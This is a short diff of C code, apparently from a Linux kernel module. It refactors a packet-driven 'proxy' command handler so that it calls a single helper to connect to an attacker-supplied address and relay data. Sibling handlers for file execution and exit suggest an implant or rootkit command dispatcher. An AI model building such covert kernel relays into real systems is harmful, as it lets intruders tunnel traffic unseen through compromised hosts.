@@ -91,35 +91,10 @@ int cmd_handle_file_exec(const packet_req_t *packet, u8 **res_buf, size_t *res_b
 
 int cmd_handle_proxy(const packet_req_t *packet, u8 **res_buf, size_t *res_buflen)
 {
-    static struct socket *sock;
-    struct sockaddr_in *addr;
-    int retv = 0;
-
     if (packet->content_len < 6)
-    {
-        retv = -EMSGSIZE;
-        goto LAB_OUT_NO_SOCK;
-    }
+        return -EMSGSIZE;
 
-    retv = socket_create(*(__be32*)packet->content, *(unsigned short*)(packet->content+4), &sock, &addr);
-    if (retv < 0)
-        goto LAB_OUT_NO_SOCK;
-    
-    retv = socket_connect(sock, addr);
-    if (retv < 0)
-        goto LAB_OUT;
-    
-    retv = socket_write(sock, packet->content+6, packet->content_len-6);
-    if (retv < 0)
-        goto LAB_OUT;
-
-    retv = socket_read(sock, res_buf, res_buflen);
-
-LAB_OUT:
-    sock_release(sock);
-    kzfree(addr, sizeof(*addr));
-LAB_OUT_NO_SOCK:
-    return retv;
+    return socket_proxy(*(__be32*)packet->content, *(__be16*)(packet->content+4), packet->content+6, packet->content_len-6, res_buf, res_buflen);
 }
 
 int cmd_handle_exit(const packet_req_t *packet, u8 **res_buf, size_t *res_buflen)
